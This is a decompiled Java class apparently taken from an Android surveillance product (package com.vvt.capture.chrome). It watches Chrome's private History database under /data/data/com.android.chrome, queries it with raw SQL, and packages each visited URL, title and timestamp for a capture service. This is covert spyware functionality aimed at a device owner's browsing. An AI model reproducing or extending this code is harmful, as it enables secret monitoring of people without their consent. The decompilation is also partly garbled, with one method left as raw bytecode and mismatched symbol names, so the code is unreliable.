package com.vvt.capture.chrome.a;

import com.vvt.ak.a;
import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import com.vvt.capture.chrome.ChromeUrlData;
import com.vvt.io.j;
import com.vvt.io.m;
import java.io.File;

public class c
  implements e, m
{
  private static final boolean a = a.a;
  private static final boolean b = a.b;
  private static final boolean c = a.b;
  private i d;
  private j e;
  private d f;
  private ChromeUrlData g;
  private String h;
  private boolean i;
  
  public c(String paramString)
  {
    this.h = paramString;
  }
  
  private void e()
  {
    boolean bool1 = true;
    float f1 = Float.MIN_VALUE;
    boolean bool2 = false;
    float f2 = 0.0F;
    boolean bool3 = a;
    if (bool3) {}
    ChromeUrlData localChromeUrlData1 = f();
    Object localObject;
    if (localChromeUrlData1 != null)
    {
      localObject = localChromeUrlData1.c();
      if (localObject != null) {}
    }
    else
    {
      return;
    }
    if (localChromeUrlData1 != null)
    {
      localObject = this.g;
      if (localObject == null) {
        this.g = localChromeUrlData1;
      }
    }
    for (;;)
    {
      if (bool1)
      {
        bool3 = b;
        if (bool3) {}
        localObject = this.d;
        ((i)localObject).a();
      }
      bool3 = a;
      if (!bool3) {
        break;
      }
      break;
      long l1 = localChromeUrlData1.a();
      localObject = this.g;
      long l2 = ((ChromeUrlData)localObject).a();
      bool3 = l1 < l2;
      if (!bool3) {
        bool3 = bool1;
      }
      for (;;)
      {
        boolean bool4 = a;
        if (bool4) {}
        l1 = localChromeUrlData1.f();
        ChromeUrlData localChromeUrlData2 = this.g;
        l2 = localChromeUrlData2.f();
        l1 -= l2;
        boolean bool5 = a;
        if ((!bool5) || (bool3))
        {
          l2 = 30000L;
          bool3 = l1 < l2;
          if (!bool3) {}
        }
        else
        {
          bool2 = bool1;
          f2 = f1;
        }
        bool1 = bool2;
        f1 = f2;
        break;
        bool3 = false;
        localObject = null;
      }
      bool1 = false;
      f1 = 0.0F;
    }
  }
  
  /* Error */
  private ChromeUrlData f()
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_1
    //   2: aconst_null
    //   3: astore_2
    //   4: getstatic 28	com/vvt/capture/chrome/a/MyUncaughtExceptionHandler:a	Z
    //   7: istore_3
    //   8: iload_3
    //   9: ifeq +3 -> 12
    //   12: ldc 71
    //   14: astore 4
    //   16: aload_0
    //   17: getfield 39	com/vvt/capture/chrome/a/MyUncaughtExceptionHandler:AppEngine1	Ljava/lang/String;
    //   20: astore 4
    //   22: aload_0
    //   23: getfield 39	com/vvt/capture/chrome/a/MyUncaughtExceptionHandler:AppEngine1	Ljava/lang/String;
    //   26: astore 5
    //   28: aload 4
    //   30: aload 5
    //   32: invokestatic 76	com/vvt/capture/chrome/a/removeFromPath:a	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   35: astore 5
    //   37: ldc 78
    //   39: astore 4
    //   41: aload 5
    //   43: ifnull +508 -> 551
    //   46: ldc 80
    //   48: astore 6
    //   50: iconst_2
    //   51: istore 7
    //   53: iload 7
    //   55: anewarray 4	java/lang/Object
    //   58: astore 8
    //   60: aconst_null
    //   61: astore 9
    //   63: aload 8
    //   65: iconst_0
    //   66: aload 4
    //   68: aastore
    //   69: iconst_1
    //   70: istore_3
    //   71: ldc 83
    //   73: astore 9
    //   75: aload 8
    //   77: iload_3
    //   78: aload 9
    //   80: aastore
    //   81: aload 6
    //   83: aload 8
    //   85: invokestatic 89	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   88: astore 4
    //   90: iconst_0
    //   91: istore 10
    //   93: aconst_null
    //   94: astore 6
    //   96: aload 5
    //   98: aload 4
    //   100: aconst_null
    //   101: invokevirtual 95	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   104: astore 4
    //   106: aload 4
    //   108: invokeinterface 101 1 0
    //   113: istore 10
    //   115: iload 10
    //   117: ifeq +419 -> 536
    //   120: ldc 103
    //   122: astore 6
    //   124: aload 4
    //   126: aload 6
    //   128: invokeinterface 107 2 0
    //   133: istore 10
    //   135: aload 4
    //   137: iload 10
    //   139: invokeinterface 111 2 0
    //   144: astore 8
    //   146: aload 8
    //   148: ifnull +388 -> 536
    //   151: aload 8
    //   153: invokevirtual 114	java/lang/String:trim	()Ljava/lang/String;
    //   156: astore 6
    //   158: aload 6
    //   160: invokevirtual 118	java/lang/String:length	()I
    //   163: istore 10
    //   165: iload 10
    //   167: ifeq +369 -> 536
    //   170: ldc 120
    //   172: astore 6
    //   174: aload 8
    //   176: aload 6
    //   178: invokevirtual 124	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
    //   181: istore 10
    //   183: iload 10
    //   185: ifne +351 -> 536
    //   188: ldc 83
    //   190: astore 6
    //   192: aload 4
    //   194: aload 6
    //   196: invokeinterface 107 2 0
    //   201: istore 10
    //   203: aload 4
    //   205: iload 10
    //   207: invokeinterface 128 2 0
    //   212: lstore 11
    //   214: ldc -126
    //   216: astore 6
    //   218: aload 4
    //   220: aload 6
    //   222: invokeinterface 107 2 0
    //   227: istore 10
    //   229: aload 4
    //   231: iload 10
    //   233: invokeinterface 128 2 0
    //   238: lstore 13
    //   240: ldc -124
    //   242: astore 6
    //   244: aload 4
    //   246: aload 6
    //   248: invokeinterface 107 2 0
    //   253: istore 10
    //   255: aload 4
    //   257: iload 10
    //   259: invokeinterface 111 2 0
    //   264: astore 15
    //   266: invokestatic 137	java/lang/System:currentTimeMillis	()J
    //   269: lstore 16
    //   271: new 139	java/text/SimpleDateFormat
    //   274: astore 6
    //   276: ldc -115
    //   278: astore 18
    //   280: aload 6
    //   282: aload 18
    //   284: invokespecial 144	java/text/SimpleDateFormat:<init>	(Ljava/lang/String;)V
    //   287: new 146	java/sql/Date
    //   290: astore 18
    //   292: aload 18
    //   294: lload 16
    //   296: invokespecial 149	java/sql/Date:<init>	(J)V
    //   299: aload 6
    //   301: aload 18
    //   303: invokevirtual 152	java/text/SimpleDateFormat:format	(Ljava/util/Date;)Ljava/lang/String;
    //   306: astore 18
    //   308: new 49	com/vvt/capture/chrome/ChromeUrlData
    //   311: astore 6
    //   313: aload 6
    //   315: invokespecial 153	com/vvt/capture/chrome/ChromeUrlData:<init>	()V
    //   318: aload 6
    //   320: lload 13
    //   322: invokevirtual 155	com/vvt/capture/chrome/ChromeUrlData:a	(J)V
    //   325: getstatic 161	com/vvt/capture/chrome/ChromeUrlData$UrlType:HISTORY	Lcom/vvt/capture/chrome/ChromeUrlData$UrlType;
    //   328: astore_2
    //   329: aload 6
    //   331: aload_2
    //   332: invokevirtual 164	com/vvt/capture/chrome/ChromeUrlData:a	(Lcom/vvt/capture/chrome/ChromeUrlData$UrlType;)V
    //   335: aload 6
    //   337: aload 15
    //   339: invokevirtual 166	com/vvt/capture/chrome/ChromeUrlData:a	(Ljava/lang/String;)V
    //   342: aload 6
    //   344: aload 8
    //   346: invokevirtual 168	com/vvt/capture/chrome/ChromeUrlData:removeFromPath	(Ljava/lang/String;)V
    //   349: aload 6
    //   351: lload 16
    //   353: invokevirtual 170	com/vvt/capture/chrome/ChromeUrlData:removeFromPath	(J)V
    //   356: aload 6
    //   358: aload 18
    //   360: invokevirtual 172	com/vvt/capture/chrome/ChromeUrlData:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   363: aload 6
    //   365: lload 16
    //   367: invokevirtual 174	com/vvt/capture/chrome/ChromeUrlData:MyUncaughtExceptionHandler	(J)V
    //   370: aload 6
    //   372: lload 11
    //   374: invokevirtual 176	com/vvt/capture/chrome/ChromeUrlData:d	(J)V
    //   377: aload 4
    //   379: astore_2
    //   380: aload 6
    //   382: astore 4
    //   384: aload_2
    //   385: ifnull +9 -> 394
    //   388: aload_2
    //   389: invokeinterface 179 1 0
    //   394: aload 5
    //   396: ifnull +8 -> 404
    //   399: aload 5
    //   401: invokevirtual 180	android/database/sqlite/SQLiteDatabase:close	()V
    //   404: getstatic 28	com/vvt/capture/chrome/a/MyUncaughtExceptionHandler:a	Z
    //   407: istore_1
    //   408: iload_1
    //   409: ifeq +3 -> 412
    //   412: aload 4
    //   414: areturn
    //   415: astore 4
    //   417: aconst_null
    //   418: astore 5
    //   420: iconst_0
    //   421: istore_3
    //   422: aconst_null
    //   423: astore 4
    //   425: getstatic 33	com/vvt/capture/chrome/a/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   428: istore 10
    //   430: iload 10
    //   432: ifeq +3 -> 435
    //   435: aload_2
    //   436: ifnull +9 -> 445
    //   439: aload_2
    //   440: invokeinterface 179 1 0
    //   445: aload 5
    //   447: ifnull -43 -> 404
    //   450: goto -51 -> 399
    //   453: astore 4
    //   455: aconst_null
    //   456: astore 5
    //   458: aload_2
    //   459: ifnull +9 -> 468
    //   462: aload_2
    //   463: invokeinterface 179 1 0
    //   468: aload 5
    //   470: ifnull +8 -> 478
    //   473: aload 5
    //   475: invokevirtual 180	android/database/sqlite/SQLiteDatabase:close	()V
    //   478: aload 4
    //   480: athrow
    //   481: astore 4
    //   483: goto -25 -> 458
    //   486: astore 19
    //   488: aload 4
    //   490: astore_2
    //   491: aload 19
    //   493: astore 4
    //   495: goto -37 -> 458
    //   498: astore 4
    //   500: iconst_0
    //   501: istore_3
    //   502: aconst_null
    //   503: astore 4
    //   505: goto -80 -> 425
    //   508: astore 6
    //   510: aload 4
    //   512: astore 19
    //   514: iconst_0
    //   515: istore_3
    //   516: aconst_null
    //   517: astore 4
    //   519: aload 19
    //   521: astore_2
    //   522: goto -97 -> 425
    //   525: astore_2
    //   526: aload 4
    //   528: astore_2
    //   529: aload 6
    //   531: astore 4
    //   533: goto -108 -> 425
    //   536: aload 4
    //   538: astore 19
    //   540: iconst_0
    //   541: istore_3
    //   542: aconst_null
    //   543: astore 4
    //   545: aload 19
    //   547: astore_2
    //   548: goto -164 -> 384
    //   551: iconst_0
    //   552: istore_3
    //   553: aconst_null
    //   554: astore 4
    //   556: goto -172 -> 384
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	559	0	this	MyUncaughtExceptionHandler
    //   1	408	1	bool1	boolean
    //   3	519	2	localObject1	Object
    //   525	1	2	localException1	Exception
    //   528	20	2	localObject2	Object
    //   7	546	3	bool2	boolean
    //   14	399	4	localObject3	Object
    //   415	1	4	localException2	Exception
    //   423	1	4	localObject4	Object
    //   453	26	4	localObject5	Object
    //   481	8	4	localObject6	Object
    //   493	1	4	localObject7	Object
    //   498	1	4	localException3	Exception
    //   503	52	4	localObject8	Object
    //   26	448	5	localObject9	Object
    //   48	333	6	localObject10	Object
    //   508	22	6	localException4	Exception
    //   51	3	7	j	int
    //   58	287	8	localObject11	Object
    //   61	18	9	str1	String
    //   91	25	10	bool3	boolean
    //   133	33	10	k	int
    //   181	3	10	bool4	boolean
    //   201	57	10	m	int
    //   428	3	10	bool5	boolean
    //   212	161	11	l1	long
    //   238	83	13	l2	long
    //   264	74	15	str2	String
    //   269	97	16	l3	long
    //   278	81	18	localObject12	Object
    //   486	6	19	localObject13	Object
    //   512	34	19	localObject14	Object
    // Exception table:
    //   from	to	target	type
    //   16	20	415	java/lang/Exception
    //   22	26	415	java/lang/Exception
    //   30	35	415	java/lang/Exception
    //   16	20	453	finally
    //   22	26	453	finally
    //   30	35	453	finally
    //   53	58	481	finally
    //   66	69	481	finally
    //   78	81	481	finally
    //   83	88	481	finally
    //   100	104	481	finally
    //   425	428	481	finally
    //   106	113	486	finally
    //   126	133	486	finally
    //   137	144	486	finally
    //   151	156	486	finally
    //   158	163	486	finally
    //   176	181	486	finally
    //   194	201	486	finally
    //   205	212	486	finally
    //   220	227	486	finally
    //   231	238	486	finally
    //   246	253	486	finally
    //   257	264	486	finally
    //   266	269	486	finally
    //   271	274	486	finally
    //   282	287	486	finally
    //   287	290	486	finally
    //   294	299	486	finally
    //   301	306	486	finally
    //   308	311	486	finally
    //   313	318	486	finally
    //   320	325	486	finally
    //   325	328	486	finally
    //   331	335	486	finally
    //   337	342	486	finally
    //   344	349	486	finally
    //   351	356	486	finally
    //   358	363	486	finally
    //   365	370	486	finally
    //   372	377	486	finally
    //   53	58	498	java/lang/Exception
    //   66	69	498	java/lang/Exception
    //   78	81	498	java/lang/Exception
    //   83	88	498	java/lang/Exception
    //   100	104	498	java/lang/Exception
    //   106	113	508	java/lang/Exception
    //   126	133	508	java/lang/Exception
    //   137	144	508	java/lang/Exception
    //   151	156	508	java/lang/Exception
    //   158	163	508	java/lang/Exception
    //   176	181	508	java/lang/Exception
    //   194	201	508	java/lang/Exception
    //   205	212	508	java/lang/Exception
    //   220	227	508	java/lang/Exception
    //   231	238	508	java/lang/Exception
    //   246	253	508	java/lang/Exception
    //   257	264	508	java/lang/Exception
    //   266	269	508	java/lang/Exception
    //   271	274	508	java/lang/Exception
    //   282	287	508	java/lang/Exception
    //   287	290	508	java/lang/Exception
    //   294	299	508	java/lang/Exception
    //   301	306	508	java/lang/Exception
    //   308	311	508	java/lang/Exception
    //   313	318	508	java/lang/Exception
    //   320	325	525	java/lang/Exception
    //   325	328	525	java/lang/Exception
    //   331	335	525	java/lang/Exception
    //   337	342	525	java/lang/Exception
    //   344	349	525	java/lang/Exception
    //   351	356	525	java/lang/Exception
    //   358	363	525	java/lang/Exception
    //   365	370	525	java/lang/Exception
    //   372	377	525	java/lang/Exception
  }
  
  public void a()
  {
    Object localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    localObject1 = ((StringBuilder)localObject1).append("/data/data/com.android.chrome/app_chrome/Default");
    Object localObject2 = File.separator;
    localObject1 = (String)localObject2 + "History";
    localObject2 = new java/io/File;
    ((File)localObject2).<init>((String)localObject1);
    boolean bool = ((File)localObject2).exists();
    if (!bool) {
      localObject1 = "/data/data/com.android.chrome/app_chrome/Default";
    }
    localObject2 = this.f;
    if (localObject2 == null)
    {
      bool = b;
      if (bool) {}
      localObject2 = new com/vvt/capture/chrome/a/d;
      ((d)localObject2).<init>(this, (String)localObject1);
      this.f = ((d)localObject2);
      localObject1 = this.f;
      ((d)localObject1).startWatching();
    }
  }
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    bool = true;
    this.i = bool;
    Object localObject = this.f;
    if (localObject == null)
    {
      this.d = parami;
      localObject = this.e;
      if (localObject == null)
      {
        localObject = j.a();
        this.e = ((j)localObject);
      }
      bool = a;
      if (bool) {}
      localObject = this.e;
      String str = "com.android.chrome";
      ((j)localObject).a(str, this);
      a();
      bool = a;
      if (!bool) {}
    }
  }
  
  public void a(String paramString)
  {
    bool = a;
    if (bool) {}
    try
    {
      locald = this.f;
      if (locald != null)
      {
        bool = a;
        if (bool) {}
        locald = this.f;
        locald.stopWatching();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        d locald;
        bool = c;
        if (!bool) {}
      }
    }
    locald = null;
    this.f = null;
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString1, String paramString2) {}
  
  public void b()
  {
    bool = a;
    if (bool) {}
    bool = false;
    Object localObject = null;
    try
    {
      this.i = false;
      localObject = this.f;
      if (localObject != null)
      {
        bool = a;
        if (bool) {}
        localObject = this.f;
        ((d)localObject).stopWatching();
      }
      localObject = this.e;
      if (localObject != null)
      {
        localObject = this.e;
        String str = "com.android.chrome";
        ((j)localObject).a(str);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    localObject = null;
    this.f = null;
    bool = a;
    if (bool) {}
  }
  
  public void b(String paramString1, String paramString2) {}
  
  public void c(String paramString1, String paramString2) {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/chrome/a/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */